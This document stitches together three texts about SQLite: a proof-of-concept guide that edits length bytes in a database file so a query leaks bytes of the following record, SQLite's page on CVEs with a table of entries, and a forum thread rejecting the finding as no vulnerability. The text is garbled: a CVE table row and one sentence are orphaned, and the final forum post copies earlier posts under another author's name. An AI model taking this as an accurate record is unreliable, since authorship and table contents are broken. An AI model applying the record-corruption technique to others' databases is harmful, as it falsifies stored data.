# Record Leaking

So this is a POC guide for a cool trick I found in sqlite. it's a bit niche, however it does have some imaginable applications. Effectively using maliciously crafted records, you can leak subsequent records. This was done in sqlite3 version `3.37.0` and `3.35.1` (the `3.35.1` example is documented in the `old_version` directory), which at the time of this writing, is the latest version (in case you don't believe me):

```
$	./sqlite3 -version
3.37.0 2021-11-27 14:13:22 bd41822c7424d393a30e92ff6cb254d25c26769889c1499a18a0b9339f5d6c8a

```

There will be a brief explanation, followed by two examples of this. For the examples, check in the `examples` file for the db files, along with the executable.

## Explanation

So sqlite is using a paging mechanism in order to handle it's memory. There is some custom memory allocation functionality for dealing with this. The database files that save the database are just straight memory pages. As such, this attack revolves around overwriting particular values in the database file, so when we query one record, it will leak data past the record. This is why it's a bit of a niche attack. However it can still have some applications, where you want to leak records in memory (could be helpful if you want to leak records that have been created, yet not written to the file).

I'll release more docs about how exactly the internal memory layout and some other functionalities work (which can be found here: <https://github.com/guyinatuxedo/sqlite3Docs>), but this is the gist. For records that store strings, they store a value which represents the size of the string. When a record goes to read a string, it looks at that size and takes its word for it. We will just overwrite that value with a larger value. This will expand the string, and can either move it or other columns into subsequent records. We will also expand the size of the record itself to match it. This is to pass a series of checks it does, to hopefully prevent shenanigans like this. Then when we query that record, we will also get data from proceeding records.

## Example 0

This is going to be a simple example where we just leak 1 byte from the next record's metadata. This is the table we will be working with, with these records:

```
sqlite> CREATE TABLE x (y varchar(100), z int);
sqlite> INSERT INTO x VALUES ("15935728", 100);
sqlite> INSERT INTO x VALUES ("15935728", 200);
sqlite> INSERT INTO x VALUES ("75395128", 300);
sqlite> INSERT INTO x VALUES ("15935728", 400);
sqlite> INSERT INTO x VALUES ("15935728", 500);
sqlite> SELECT * FROM x;
15935728|100
15935728|200
75395128|300
15935728|400
15935728|500

```

Now for this, we will edit the record with the `75395128`. Currently, it has these bytes:

```
0D 03 03 1D 02 37 35 33 39 35 31 32 38 01 2C

```

With the next record having these bytes:

```
0D 02 03 1D 02 31 35 39 33 35 37 32 38 00 C8

```

Which have these specific values:

```
Record Length: 0x0D (13 bytes)
Length of String: 0x08 (((0x1D - 12) / 2), check other pages for explanation)
Integer Value Z : 0x012c (300)

```

We will change these values to be this:

```
Record Length: 0x0E
Length of String: 0x1F (string length of 9)

```

Which becomes these bytes. So effectively we just extended the string length by one, along with the length of the record:

```
0E 03 03 1F 02 37 35 33 39 35 31 32 38 01 2c

```

Now the records look like this:

```
sqlite> .open ex0_corrupted
sqlite> SELECT * FROM x;
15935728|100
15935728|200
75395128|11277
15935728|400
15935728|500

```

Now the `z` int value for the `75395128` has changed to be `11277`, which in hex is `0x2c0d`. Effectively what we have done is we moved this value over by one byte, so the `0x2c` is the higher byte. Also if we look at the next record over, we see that it starts with `0x0d`, which we are leaking here. The bytes that end this record, and move onto the next look like this:

```
01 2C 0D 02 03

```

The `0x0D` value we are leaking from the next record signifies the size of that record.

## Example 1

For this example, we have this table:

```
sqlite> CREATE TABLE x (y varchar(100));

```

With these records:

```
sqlite> .open ex1
sqlite> CREATE TABLE x (y varchar(100));
sqlite> INSERT INTO x VALUES ("15935728");
sqlite> INSERT INTO x VALUES ("15935728");
sqlite> INSERT INTO x VALUES ("75395128");
sqlite> INSERT INTO x VALUES ("15935728");
sqlite> INSERT INTO x VALUES ("15935728");
sqlite> SELECT * FROM x;
15935728
15935728
75395128
15935728
15935728

```

So for here, we are going to leverage the `75395128` row to leak part of the following row. For that, let's first take a look at the bytes that comprise those records:

```
0A 03 02 1D 37 35 33 39 35 31 32 38
0A 02 02 1D 31 35 39 33 35 37 32 38

```

Now for this, we are simply going to extend the length of the string column, into the next row. I want to leak the `159` from the proceeding row. So we can see that the `159` (`31 35 39`) is `4` bytes away from the end of the string. So to leak those three bytes, we will need to extend the string by `4 + 3 = 7` bytes. As such we will need to increase the size of the record, and the length of the string by seven. So the record length will be `0x11`, and the string length will be `0x0F` (which encoded in sqlite3 format is `0x2B`):

```
11 03 02 2B 37 35 33 39 35 31 32 38
0A 02 02 1D 31 35 39 33 35 37 32 38

```

Now one thing to note, there is a newline character `0x0A` in between them. As such, we should also leak a newline. And when we try running a query, we see that we are getting a record leak:

```
sqlite> .open ex1_corrupted
sqlite> SELECT * FROM x;
15935728
15935728
75395128
159
15935728
15935728

```

# 1. Executive Summary

* CVEs about SQLite probably do not apply to your use of SQLite.
* All historical vulnerabilities reported against SQLite require at least
  one of these preconditions:

  1. The attacker can submit and run arbitrary SQL statements.
  2. The attacker can submit a maliciously crafted database file to the
     application that the application will then open and query.
* Few real-world applications meet either of these preconditions, and hence
  few real-world applications are vulnerable, even if they use older
  and unpatched versions of SQLite.
* The SQLite development team fixes bugs promptly,
  usually within hours of discovery. New releases of SQLite
  are issued if the bug seems likely to impact real-world
  applications.
* Grey-hat hackers are rewarded based on the number and severity of
  CVEs that they write. This results in a proliferation of CVEs that
  have minor impact, or no impact at all, but which make
  exaggerated impact claims.
* Very few CVEs written about SQLite are real vulnerabilities in the
  sense that they do not give any new capabilities to an attacker.
  Consider:

  1. Almost all CVEs written against SQLite require the ability to
     inject and run arbitrary SQL.
  2. The advertised consequence of most CVEs is "denial of service",
     typically by causing a crash through a NULL pointer dereference or
     a division by zero, or similar.
  3. But if an attacker can already run
     arbitrary SQL, they do not need a bug to cause a denial of service.
     There are plenty of perfectly legal and valid SQL statements
     that will consume unlimited CPU, memory, and disk I/O in order
     to create a denial-of-service without requiring help from bugs.
  4. Hence, the mere fact that an attacker has a way to inject and run
     arbitrary SQL is in and of itself a denial-of-service attack. That
     the arbitrary SQL might also tickle a bug in SQLite and cause a
     crash is not a new vulnerability.
* The SQLite developers do not write CVEs. Any CVEs you find on
  SQLite are generated by third-parties, often without any input from the
  core developers. A common scenario is that someone will report a bug in
  SQLite, which will promptly be fixed, then weeks later a CVE for that bug will
  appear, unbeknownst to the developers.
* You should not assume that a CVE about
  SQLite contains authoritative information.
  CVEs often contain inaccuracies.
  The SQLite developers have attempted to add clarifications and
  corrections to CVEs about SQLite.

# 2. About CVEs

CVEs ("Common Vulnerabilities and Exposures") are reports of software
bugs that might allow a system to be hacked. The idea
behind CVEs is sound. They provide a common naming scheme whereby
software bugs that might compromise information security can be easily
tracked.

While the original idea behind CVEs is sound, the current processes for
creating and managing CVEs are inadequate. There are countless grey-hat
hackers running fuzzers against a wide-variety of open-source software
products (SQLite as well as many others) and writing up CVEs against
any problems they find. The grey-hats are rewarded, sometimes with
prestige and sometimes financially, by the number and severity of
the CVEs they write. This incentive results in a proliferation
of CVEs which are often not well-vetted and which can have exaggerated
impact claims. The quality-control procedures for CVEs are unable
to cope with this flood of inputs, making it difficult to correct
exaggerated, misleading, omitted, or inaccurate claims.

This is not to say that CVEs are useless. CVEs do still (mostly)
report actual bugs. But in most cases the bugs are not true vulnerabilities,
in the sense that they do not contribute to data loss or compromise
in and of themselves.
It is good that bugs are reported and fixed. But not every bug is
accessible from every application. In the case of SQLite, most of the
bugs reported by CVEs are inaccessible in most applications. Upgrading
to the latest version of SQLite is always a good plan, but it need not
be an emergency just because an anonymous grey-hat on the internet
wrote up a CVE.

## 2.1. A separate SQL injection vulnerability is usually required

Other C-libraries that process complex structured inputs will
routinely be asked to deal with unvetted inputs from untrusted
sources. Libraries like libjpeg, or libzip, or OpenSSL are
handed input streams that come directly from potentially hostile
agents.

But database engines like SQLite are usually not this way.
The SQL scripts that are passed into SQLite come from the
(trusted) application itself, not from an attacker. Sometimes
applications contain bugs by which an external attacker can
trick the application into sending SQL of the attackers design
into the database engine. This is a separate bug in the
application called an
[SQL Injection
vulnerability](https://en.wikipedia.org/wiki/SQL_injection). Since SQL text is executable code, an
SQL Injection vulnerability is actually a special case of a
[Remote
Code Execution (RCE) vulnerability](https://en.wikipedia.org/wiki/Arbitrary_code_execution). An SQL Injection is perhaps not
quite as bad as other kinds of RCEs because,
while SQL is a powerful language, it is not as convenient
for crafting an exploit as Python or shell script or raw machine code.
Nevertheless, an SQL Injection is a serious problem.

Most CVEs written about SQLite assume that the attacker is
able to run arbitrary SQL scripts in SQLite. In most applications,
this means that there must first be an SQL Injection vulnerability
that allows the attacker to inject the malicious SQL.

A few applications do allow untrusted SQL scripts received from
potentially hostile agents to be run direct in SQLite. The main
example of this is the Chrome and Safari web browsers, which allow
an anonymous web page to run SQL using the WebSQL feature of Javascript.
This is done inside a sandbox with tightly controlled constraints on
resources, lest the SQL script try to soak up all available memory
or CPU cycles in a denial-of-service attack. Chrome and Safari
have the infrastructure in place to allow a hostile agent to run
code which does not harm or compromise the rest of the machine.
They have to, as they also run Javascript which could, if not
tightly controlled, do even more damage than unrestrained SQL.
Apart from Chrome and Safari, no applications known to the
SQLite developers deliberately allows an anonymous remote agent
to run arbitrary SQL text.

However, most CVEs written against SQLite flippantly assume
that an attacker is free to run any arbitrary SQL in the database
engine. So to a good approximation, this means most CVEs
written against SQLite really only apply to SQLite as it is
used in Chrome and Safari. Or, in other words, most CVEs
for SQLite do not apply to you unless you are one of the
developers of Chrome or Safari.

## 2.2. Defense Against Dark Arts

Most applications can use SQLite without having to worry about
bugs in obscure SQL inputs. If the application controls
the SQL, and the application is not deliberately trying to break
SQLite, then everything should just work.
It is not necessary to have the latest patched version of SQLite.
Any older version should work just fine.

However, there are some occasions where an application does need
to be able to safely run untrusted SQL. The SQLite developers work hard
to make SQLite safe for this purpose, though there are occasional
slip-ups. It is good to keep up-to-date with the latest patches
in this case. The separate [defense against dark arts](security.html) document
contains additional suggestions that can help prevent zero-day
attacks in cases where SQLite is given inputs that come directly
from untrusted sources.

## 2.3. The SQLite Developer Policy Toward CVEs

SQLite developers fix all bugs in SQLite as soon as they are reported,
usually within a few hours. The fixes are immediately available on the
[public SQLite source tree](https://sqlite.org/src/timeline).
If a bug seems like it might cause problems for existing applications,
a new patch release for SQLite will be issued.

However, the SQLite developers do not track CVEs. There are
various reasons for this:

1. The developers often do not find out about CVEs until long after the
   bug is fixed. You can see this by the fact that many CVEs reference the
   bug fix in their initial report.
2. CVEs are a low-quality source of information about bugs in SQLite
   that are likely to affect most applications.
3. Almost all bugs reported by CVEs are just bugs and not
   true vulnerabilities. Claiming that they are vulnerabilities is
   stretching the meaning of the word "vulnerability" and the SQLite
   developers do not wish to participate in that deception.
4. The developers have no editorial influence on the content of CVEs,
   and they do not like to be controlled by groups in which they have
   no voice.

# 3. Status Of Recent SQLite CVEs

Though the SQLite developers do not consider CVEs to be a reliable
source of information about bugs in SQLite, they recognize that many
groups, and especially small teams working at the bottom of tall
bureaucracies, sometimes need to track CVEs, whether they are useful
or not. To aid in this chore, the following table of recent CVEs
affecting SQLite is provided.

If you notice new CVEs associated with SQLite that are not in
the table below, please bring them to the attention of the developers
on the [SQLite Forum](https://sqlite.org/forum/about) so they can
be added.

| CVE Number | Fix | Comments |
| --- | --- | --- |
| [CVE-2024-0232](https://nvd.nist.gov/vuln/detail/CVE-2024-0232) | [3.43.2](releaselog/3_43_2.html)(2023-10-10) | An attacker that can inject arbitrary SQL statements into an application might be able to provoke a use-after-free bug in SQLite's JSON parser that can (in theory) lead to an application crash and denial of service. See [forum thread b25edc1d4662](https://sqlite.org/forum/forumpost/b25edc1d4662ebca) for the bug report. |
| [CVE-2023-32697](https://nvd.nist.gov/vuln/detail/CVE-2023-32697) | Not a bug in SQLite | This is a bug in the SQLite JDBC library, which is a wrapper library that provides access to SQLite from Java. SQLite JDBC is created and maintained independently from SQLite. Despite the use of "SQLite" in the name, the SQLite JDBC library is not affiliated with the SQLite project in any way. The vulnerability identified by this CVE is in the separate SQLite JDBC wrapper library and does not affect SQLite itself. |
| [CVE-2023-39939](https://nvd.nist.gov/vuln/detail/CVE-2023-39939) | Not a bug in SQLite | This is not a bug in SQLite. This is an [SQL injection bug](https://en.wikipedia.org/wiki/SQL_injection) in an application (LuxCal Web Calendar) that links against SQLite. Even though this CVE is not about SQLite, "SQLite" is mentioned in the description and so we list it here. |
| [CVE-2023-39543](https://nvd.nist.gov/vuln/detail/CVE-2023-39543) | Not a bug in SQLite | This is not a bug in SQLite. This is an [XSS vulnerability](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) in a separate application (LuxCal Web Calendar) that links against SQLite. The bug is in the application, not in SQLite. However "SQLite" is mentioned in the description and so we list it here. |
| [CVE-2023-7104](https://nvd.nist.gov/vuln/detail/CVE-2023-7104) | [3.43.1](releaselog/3_43_1.html)(2023-09-11) | This is a bug in the [session extension](sessionintro.html) of SQLite, not in the SQLite core. This bug is only reachable by applications that recompile SQLite using the [-DSQLITE\_ENABLE\_SESSION](compile.html#enable_session) compile-time option and then use the Session C-language APIs to process a [changeset](sessionintro.html#changeset) that has been subtly corrupted by an adversary. So this bug probably does not apply to you. See [forum post f935c4708dd528d9](https://sqlite.org/forum/forumpost/f935c4708dd528d9) for additional information. |
| [CVE-2022-46908](https://nvd.nist.gov/vuln/detail/CVE-2022-46908) | Not a bug in the core SQLite library | This is a bug in the --safe command-line option of the [command-line shell](cli.html) program that is available for accessing SQLite database files. The bug does not exist in the SQLite library. Nor is it an issue for the [CLI](cli.html) as long as the user does not depend on the --safe option. It is not serious. It is debatable whether or not this is a security issue. |
| [CVE-2022-38627](https://nvd.nist.gov/vuln/detail/CVE-2022-38627) | Not a bug in SQLite | This is not a bug in SQLite. This is an [SQL injection bug](https://en.wikipedia.org/wiki/SQL_injection) in a specific PHP application. In other words, the bug is in the PHP application code, not in SQLite. Even though this CVE is not about SQLite, "SQLite" is mentioned in the publicity about the bug and so we list it here. |
| [CVE-2022-35737](https://nvd.nist.gov/vuln/detail/CVE-2022-35737) | [3.39.2](releaselog/3_39_2.html)(2022-07-21) | This bug is an array-bounds overflow. The bug is only accessible when using some of the C-language APIs provided by SQLite. The bug cannot be reached using SQL nor can it be reached by providing SQLite with a corrupt database file. The bug only comes up when very long string inputs (greater than 2 billion bytes in length) are provided as arguments to a few specific C-language interfaces, and even then only under special circumstances. |
| [CVE-2022-24854](https://nvd.nist.gov/vuln/detail/CVE-2022-24854) | Not a bug in SQLite | This CVE describes a bug in an application that uses SQLite, not in SQLite itself. SQLite is doing everything correctly. The application grants users the ability to run SQL statements, using SQLite, that can leak or change information that those users should not normally have access to. This is purely an application bug. It does not describe a malfunction or vulnerability in SQLite. |
| [CVE-2022-21227](https://nvd.nist.gov/vuln/detail/CVE-2022-21227) | Not a bug in SQLite | This CVE describes a bug in a third-party packages that provides a binding for SQLite to Node.js. The bug reported is in the third-party Node.js binding, not in SQLite itself. Do not be confused by the use of the word "SQLite" in the ambiguously-worded CVE description. |
| [CVE-2021-45346](https://nvd.nist.gov/vuln/detail/CVE-2021-45346) | Not a bug in SQLite | This CVE is misinformation. See the discussion around [SQLite forum post 53de8864ba114bf](https://sqlite.org/forum/forumpost/53de8864ba114bf6). |
| [CVE-2021-42169](https://nvd.nist.gov/vuln/detail/CVE-2021-42169) | Not a bug in SQLite | This CVE has nothing whatsoever to do with SQLite. It is about a bug in application that happens to use SQLite. Since SQLite is mentioned in the CVE description, the CVE is included here to emphasize that this is not an SQLite bug. |
| [CVE-2021-36690](https://nvd.nist.gov/vuln/detail/CVE-2021-36690) | Not a bug in the core SQLite library | This bug is not in the SQLite core library, but rather in an [experimental extension](https://www.sqlite.org/src/dir?ci=trunk&name=ext/expert) that is used to implement the [.expert command](cli.html#expert) in the [CLI](cli.html). The code that contains the bug does not appear in [standard SQLite builds](amalgamation.html), though it is included in the [sqlite3.exe command-line tool](cli.html). Applications must link against the extra source code files that implement the extension and take other deliberate actions to activate the extension before the troublesome code can be run. For the rare application that uses the troublesome extension, the consequence of this bug is that malicious SQL can cause a NULL pointer deference and denial of service. [(details)](https://sqlite.org/forum/info/78165fa25061742f) |
| [CVE-2021-31239](https://nvd.nist.gov/vuln/detail/CVE-2021-31239) | Not a bug in the core SQLite library | This is a bug in the [CLI](cli.html). It allows a user with unrestricted shell access to cause a denial-of-service. Of course, there are a million easier ways for a user with unrestricted shell access to cause far worse mischief. The problem was in the [appendvfs extension](https://sqlite.org/src/doc/trunk/ext/misc/appendvfs.c) which is not a part of standard SQLite. [(details)](https://www.sqlite.org/src/info/04f6439f4d9b9b1f) |
| [CVE-2021-28305](https://nvd.nist.gov/vuln/detail/CVE-2021-28305) | Not a bug in SQLite | This is not a bug in SQLite. The bug is in a third-party application that uses SQLite. SQLite is mentioned by name in the CVE description, however, so we have included the CVE in the list. |
| [CVE-2021-23404](https://nvd.nist.gov/vuln/detail/CVE-2021-23404) | Not a bug in SQLite | This is not a bug in SQLite. The bug is in a third-party application that uses SQLite and includes "sqlite" in its name. This CVE is included on the list because it mentions SQLite even though the bug has nothing to do with SQLite. |
| [CVE-2021-20227](https://nvd.nist.gov/vuln/detail/CVE-2021-20227) | [3.34.1](releaselog/3_34_1.html)(2021-01-20) | Malicious SQL statement causes read-after-free. No harm can come of this particular read-after-free instance, as far as anyone knows. The bug is undetectable without a memory sanitizer. The CVE claims that this bug is an RCE - a Remote Code Execution vulnerability, but that claim is incorrect. The RCE claim is misinformation. [(details)](https://sqlite.org/src/info/30a4c323650cc949) |
| [CVE-2021-20223](https://nvd.nist.gov/vuln/detail/CVE-2021-20223) | [3.34.0](releaselog/3_34_0.html)(2020-12-01) | The problem identified by this CVE is not a vulnerability. It is a malfunction. A coding error causes [FTS5](fts5.html) to sometimes return inconsistent and incorrect results under obscure circumstances, but no memory errors occur. [(details)](https://sqlite.org/src/info/b7b7bde9b7a03665) |
| [CVE-2020-15358](https://nvd.nist.gov/vuln/detail/CVE-2020-15358) | [3.32.3](releaselog/3_32_3.html)(2020-06-18) | Malicious SQL statement causes a read past the end of a heap buffer. [(details)](https://sqlite.org/src/info/8f157e8010b22af0) |

[(details)](https://sqlite.org/src/info/a4dd148928ea65bd) |
| [CVE-2020-13631](https://nvd.nist.gov/vuln/detail/CVE-2020-13631) | [3.32.0](releaselog/3_32_0.html)(2020-05-22) | Malicious SQL statement (an ALTER TABLE that tries to rename a [virtual table](vtab.html) into one of its own [shadow tables](vtab.html#xshadowname)) causes an infinite loop and denial of service. [(details)](https://sqlite.org/src/info/eca0ba2cf4c0fdf7) |
| [CVE-2020-13630](https://nvd.nist.gov/vuln/detail/CVE-2020-13630) | [3.32.0](releaselog/3_32_0.html)(2020-05-22) | Malicious SQL statement causes a read-only use-after-free, possibly resulting in an incorrect output from the [snippet()](fts3.html#snippet) SQL function of the [FTS3](fts3.html) extension. There is no known way to exfiltrate data or crash the application using this bug. [(details)](https://sqlite.org/src/info/0d69f76f0865f962) |

Even though this is a stack overwrite, there is no known way to redirect control or otherwise escalate the level of harm. This is a denial-of-service attack only.

# Potential Bug (Record Leaking)

### (1.1) Originally by [anonymous](/forum/timeline?ss=v&y=f&vfx&u=anonymous) with edits by Richard Hipp ([drh](/forum/timeline?ss=v&y=f&vfx&u=drh)) on 2021-03-16 11:33:01 from [1.0](/forum/forumpost/cebe34f489?hist) [[link]](/forum/forumpost/9435af296f90312d) [[source]](/forum/forumpost/9435af296f90312d?raw)

So I was playing around and found something interesting. By modifying the records within a database file, you can cause it so by querying one record, you leak data in subsequent records. For more documentation checkout the github link below. This is for version 3.35.1.

<https://github.com/guyinatuxedo/sqlite3_record_leaking>

### (2) By Rowan Worth ([sqweek](/forum/timeline?ss=v&y=f&vfx&u=sqweek)) on 2021-03-16 08:12:36 in reply to [1.0](/forum/forumpost/cebe34f489) [[link]](/forum/forumpost/509238975fa4f7e6) [[source]](/forum/forumpost/509238975fa4f7e6?raw)

It's a curious observation but I'm struggling to appreciate its applicability as any sort of attack. If you have the ability to manipulate the database's underlying record structure, why don't you just read the data of interest directly? From the operating system's perspective you must have the ability to read the entire file by definition, otherwise sqlite wouldn't be able to read it...

I'd be interested to know whether the integrity\_check or quick\_check PRAGMAs notice that the records overlap after munging them like this.

### (3) By Gunter Hick ([gunter\_hick](/forum/timeline?ss=v&y=f&vfx&u=gunter_hick)) on 2021-03-16 08:22:19 in reply to [1.0](/forum/forumpost/cebe34f489) [[link]](/forum/forumpost/e90ed5c9e00c0c46) [[source]](/forum/forumpost/e90ed5c9e00c0c46?raw)

```

Back in ancient computer times (1983), a coworker installed ad DnD Game called Moria. This was played on a standard text console. Looking at the executable, I found a list of plain text with names of weapons, followed by expressions like 1D6. So I patched the string after "Katana" to read "9D9", which made playing the game very much easier.

Never in my mind would I have thought to report this as a "bug".

You are doing something quite similar here. You already have read and write access to the SQLite db file and could decode every single record it contains. Your hack does not expose anything you do not already have access to.

If you want to have SQLite db files that are resistant against file level access, you should consider buying a SEE license. Or writing your own VFS that encrpyt/decrypts pages between disk and memory.

```

### (4.1) By Ryan Smith ([cuz](/forum/timeline?ss=v&y=f&vfx&u=cuz)) on 2021-03-16 14:28:49 edited from [4.0](/forum/forumpost/a5172b490e?hist) in reply to [1.0](/forum/forumpost/cebe34f489) [[link]](/forum/forumpost/f12199c34102a05e) [[source]](/forum/forumpost/f12199c34102a05e?raw)

I'm with the other posters that it is hard to imagine it being used in an "attack" of any sort, but just posting cause I get the feeling they also downplay it's bug status.

*EDIT: Revising my statements after reading Gunter's reply:*

~~It IS a BUG, and a very important one. It causes input to the DB to have unwanted/inaccurate data as a consequence, where you put in X and get back Y - The very definition of a Bug~~.

It definitely isn't a bug.

Whether it is an Attack vector... well, I can't see it. For that it has to tweak/open/access something that was not accessible/tweak-able/open-able before - which it doesn't.

~~Nice write-up though, and if I may ask, how did you find this bug? It seems like there might be an interesting story there~~.

### (5) By Gunter Hick ([gunter\_hick](/forum/timeline?ss=v&y=f&vfx&u=gunter_hick)) on 2021-03-16 11:30:26 in reply to [4.0](/forum/forumpost/a5172b490e) [[link]](/forum/forumpost/f2397a686fa1f22f) [[source]](/forum/forumpost/f2397a686fa1f22f?raw)

It would be a bug if you could repro the case with the SQLite shell, SQL statements and documented API calls.

This case is none of the above. It is bypassing SQLite altogether and changing the database file directly. This is as much a bug as deleting the database file and then complaining that SQLite cannot open it any more. Or like Windows doing its sandbox-virus-protection-stuff and whisking away the database file out from underneath an application.

As stated earlier, if you want a database file that is resistant to casual direct manipulation, you need to checksum and encrypt the page in the VFS layer. And even then, a clever guy with a debugger may still be able to perform the same chicanery with the memory image of the page.

### (6) By [anonymous](/forum/timeline?ss=v&y=f&vfx&u=anonymous) on 2022-02-24 15:10:41 in reply to [1.1](/forum/forumpost/9435af296f) [[link]](/forum/forumpost/f7dfd34c3f81f318) [[source]](/forum/forumpost/f7dfd34c3f81f318?raw)

I work at a large company and in our daily monitoring this "vulnerability" popped up for impact triage. It seems like RedHat has yesterday assigned CVE-2021-45346 for it, see links below:

<https://nvd.nist.gov/vuln/detail/CVE-2021-45346>
<https://bugzilla.redhat.com/show_bug.cgi?id=2054793>

Please add this CVE to your "Vulnerabilities" page and state more prominently that this is considered "not a bug". Thanks for maintaining SQLite!

### (7.2) By Richard Hipp ([drh](/forum/timeline?ss=v&y=f&vfx&u=drh)) on 2022-02-24 18:21:40 edited from [7.1](/forum/forumpost/db6a05dfd3?hist) in reply to [6](/forum/forumpost/f7dfd34c3f) [[source]](/forum/forumpost/056d557c2f8c452e?raw)

This is what [CVE-2021-45346](https://nvd.nist.gov/vuln/detail/CVE-2021-45346)
is saying:

* Corrupt a database file such that two different rows are
  assigned overlapping storage space.
  Call those two rows X and Y.
* Trick the application into writing sensitive information into X.
* Read out the sensitive information by querying Y.

Yes, you can do that in SQLite. You can also do it in just about every other
RDBMS and every filesystem ever invented. Calling this a "vulnerability"
is stretching the meaning of the word "vulnerability".

Note that SQLite will detect and report the corruption, unfailingly, if you
ask it (using "[PRAGMA quick\_check](https://sqlite.org/pragma.html#pragma_quick_check))

Note that if you have sufficient write access such that you can corrupt
the database file to cause storage space for two rows to overlap, then
you could (with far less effort) just install a new trigger into the schema
that causes content written into SENSITIVE\_TABLE to be mirrored into
PUBLIC\_TABLE, and accomplish the same data exfiltration. Indeed, a similar
attack will also work on *any* RDBMS.

The claim in the CVE title that this is a "memory leak" is false, at least
according to any definition of "memory leak" that I'm aware of. Perhaps the
CVE author meant to say that this is a data exfiltration attack, but just
doesn't know the difference between data exfiltration and a memory leak.

The implication in the CVE that the content of memory elsewhere in the
application might be exfiltrated is false. The only exfiltration possible
here is data which has been explicitly written into the database. You don't
necessarily have to COMMIT the data, but it has to be written to the database
in order to be exfiltrated.

CVE-2021-45346 is a premier example of a useless CVEs and why you should
critically examine CVEs before believing that they are real vulnerabilities.

### (8) By [anonymous](/forum/timeline?ss=v&y=f&vfx&u=anonymous) on 2022-02-24 17:30:04 in reply to [7.0](/forum/forumpost/53de8864ba) [[link]](/forum/forumpost/63cf883d4c3dc30b) [[source]](/forum/forumpost/63cf883d4c3dc30b?raw)

Thanks for this long post. I am fully aware that this one is a stupid one and there is nothing which can be done. I wouldn't not even bothered to post it here if there wouldn't be this [this statement](https://www.sqlite.org/cves.html) on your homepage:

> If you notice new CVEs associated with SQLite that are not in the table below, please bring them to the attention of the developers on the SQLite Forum so they can be added.

### (10) By [anonymous](/forum/timeline?ss=v&y=f&vfx&u=anonymous) on 2022-02-25 21:25:21 in reply to [8](/forum/forumpost/63cf883d4c) [[link]](/forum/forumpost/850d8ff7be4962d0) [[source]](/forum/forumpost/850d8ff7be4962d0?raw)

I think that the description in that table should mention that you can use `PRAGMA quick_check` to mitigate it if you are worried about it.

### (9.1) By Simon Slavin ([slavin](/forum/timeline?ss=v&y=f&vfx&u=slavin)) on 2022-02-24 17:39:14 edited from [9.0](/forum/forumpost/a42e889bff?hist) in reply to [6](/forum/forumpost/f7dfd34c3f) [[link]](/forum/forumpost/f6625201d187d2bc) [[source]](/forum/forumpost/f6625201d187d2bc?raw)

Thanks for this long post. I am fully aware that this one is a stupid one and there is nothing which can be done. I wouldn't not even bothered to post it here if there wouldn't be this [this statement](https://www.sqlite.org/cves.html) on your homepage:

> If you notice new CVEs associated with SQLite that are not in the table below, please bring them to the attention of the developers on the SQLite Forum so they can be added.

I think that the description in that table should mention that you can use `PRAGMA quick_check` to mitigate it if you are worried about it.
